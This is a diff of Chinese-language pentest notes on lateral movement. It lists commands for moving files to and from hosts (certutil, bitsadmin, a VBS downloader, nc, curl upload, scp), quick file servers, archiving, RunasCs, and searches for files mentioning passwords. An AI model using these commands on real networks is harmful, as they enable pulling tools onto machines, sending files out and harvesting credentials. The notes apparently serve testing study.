@@ -1,4 +1,4 @@
-# *横向（此阶段的目的是为了内网域环境的横向渗透，获得域控权限，方便后续隐藏。）
+# Lateral_Movement
 
 时间同步，dns解析，spn(创建，扫描，删除)
 
@@ -1085,39 +1085,19 @@ kali : ./pingtunnel -type client -l 0.0.0.0:1234 -s 192.168.12.131 -t 192.168.11
 \#建立端口转发,将fe80::5b33:115b:ce91:1d37的22端口映射到kali本地7777端口，使用ipv6通信
 ```
 
-
-
-------
-
-idoine dns隧道
-
-
-
-
-
-
-
-
-
-
-
 # 上传下载,服务建立,压缩解压缩,提升交互性,查找(文件,内容)
 
-certutil,bitsadmin,vbs,wget,curl,nc,scp,msfconsole,invoke-webrequest
+#### 上传下载
 
-http,smb,tcp,ftp
-
-------
-
-certutil
+###### certutil
 
 certutil.exe -urlcache -split -f http://192.168.1.192/file.txt file.txt 
 
-bitsadmin
+###### bitsadmin
 
 bitsadmin /rawreturn /transfer down "https://www.baidu.com/robots.txt" c:\robots.txt #c:\robots.txt 必须是绝对路径
 
-vbs
+###### vbs
 
 ++++++++++++++++++++++++++++++
 
@@ -1145,17 +1125,17 @@ aGet.SaveToFile "C:\Users\qwe2\Desktop\main\test.txt",2
 
 echo 'Set Post = CreateObject("Msxml2.XMLHTTP"):Set Shell = CreateObject("Wscript.Shell"):Post.Open "GET","http://192.168.11.131:8000/test.txt",0:Post.Send():Set aGet = CreateObject("ADODB.Stream"):aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile "C:\Users\qwe2\Desktop\main\test.txt",2' > download.vbs ; .\download.vbs ; sleep 1 ; del download.vbs
 
-wget(powershell)
+###### wget(powershell)
 
 wget http://192.168.163.131/pass -o pass
 
-nc
+###### nc
 
 nc -lvnp 443 < pass
 
 .\nc.exe 192.168.163.131 443 > pass1
 
-scp
+###### scp
 
 scp kali@192.168.163.131:/home/kali/main_box/pass pass1
 
@@ -1167,17 +1147,19 @@ scp pass1 kali@192.168.163.131:/home/kali/pass4
 
 scp -r kali@192.168.163.131:/home/kali/main_box/1 3 #将目录1重命名为3
 
-curl
+###### curl
 
 curl http://xxxxx/xxx -o xxx
 
-msfconsole
+curl.exe -X POST http://127.0.0.1:8000/upload -F "files=@c:/..." #上传(需要远程http可写)
+
+###### metasploit
 
 download xxx xxx
 
 upload xxx xxx
 
-powershell
+###### Invoke-WebRequest
 
 Invoke-WebRequest URL -o"本地保存路径"
 
@@ -1185,13 +1167,15 @@ wget curl 别名
 
 ------
 
-服务器建立
+#### 服务建立
 
-http
+###### http
 
 python -m http.server 8000
 
 python2 -m SimpleHTTPServer 8000
+
+python3 -m uploadserver 8000 --allow-replace #可写的http
 
 php -S 0:8000 #如果从浏览器访问需要index.php
 
@@ -1203,7 +1187,7 @@ miniserve -p 8000 . #rust
 
 npx http-server -p 8000 #nodejs
 
-smb
+###### smb
 
 impacket-smbserver guest . -smb2support
 
@@ -1213,19 +1197,19 @@ impacket-smbclient anonymous@192.168.12.130 -no-pass
 
 impacket-smbclient admin:passwd@192.168.12.130 -no-pass
 
-tcp
+###### tcp
 
 nc -lvnp 443 < 123.txt
 
 nc xxx.xxx.xxx.xxx 443 > 321.txt
 
-ftp
+###### ftp
 
 python -m pyftpdlib -p 21
 
 ------
 
-压缩技术详解
+#### 压缩解压缩
 
 gz bz2 xz 不支持多文件
 
@@ -1233,9 +1217,13 @@ zip rar 7z 支持单文件，多文件，目录结构
 
 tar 支持打包多文件，目录结构
 
+makecab&cabextract
+
+compress-archive&expand-archive
+
 ------
 
-gz
+###### gz
 
 gzip 1.txt          #不留存 -k留存
 
@@ -1245,7 +1233,7 @@ gzip -d 1.txt.gz
 
 ------
 
-bz2
+###### bz2
 
 bzip2 1.txt
 
@@ -1255,7 +1243,7 @@ bzip2 -d 1.txt.bz2
 
 ------
 
-xz
+###### xz
 
 xz 1.txt
 
@@ -1265,7 +1253,7 @@ xz -d 1.txt.xz
 
 ------
 
-tar
+###### tar
 
 tar -czvf 1.tar.gz 1 
 
@@ -1285,7 +1273,7 @@ tar -cvf archive.tar file1.txt file2.txt mu 打包多个文件 其中mu是目录
 
 ------
 
-zip
+###### zip
 
 zip 1.zip 1
 
@@ -1303,7 +1291,7 @@ zip -e -P "123" 1.txt.zip 1.txt     -e 设置密码，-P 静默输入密码，�
 
 ------
 
-rar
+###### rar
 
 rar a 1.rar 1
 
@@ -1321,7 +1309,7 @@ rar a -p12345 -m0 -v20m 1.rar 1
 
 ------
 
-7z
+###### 7z
 
 7z -l 列出其中的内容
 
@@ -1337,6 +1325,8 @@ rar a -p12345 -m0 -v20m 1.rar 1
 
 ------
 
+###### makecab&cabextract
+
 .cab[单文件]
 
 makecab
@@ -1351,6 +1341,8 @@ cabextract 1.cab / 7z x 1.cab
 
 ------
 
+###### compress-archive&expand-archive
+
 compress-archive 123.jpg 123.zip
 
 compress-archive 文件夹 文件夹.zip
@@ -1361,7 +1353,7 @@ expand-archive 文件夹 文件夹.zip
 
 ------
 
-提升交互性
+#### 提升交互性
 
 RunasCs.exe one one -l 8 "cmd /c whoami"
 
@@ -1375,9 +1367,9 @@ rlwrap -cAr
 
 ------
 
-查找文件(文件,内容)
+#### 查找文件(文件,内容)
 
-windows
+###### windows
 
 (cmd)
 
@@ -1391,7 +1383,7 @@ gci -Path . -Recurse -Force | ? { $_.Name -like "*passw*" } #查找带passw字�
 
 gci -Path . -recurse | ? {$_.name -like "*.txt" } | sls -Pattern "passw" #递归查找txt文件中包含passw字样的 行
 
-linux
+###### linux
 
 find /tmp/. -iname "*passw*" #查找带passw字样的 目录和文件名
 
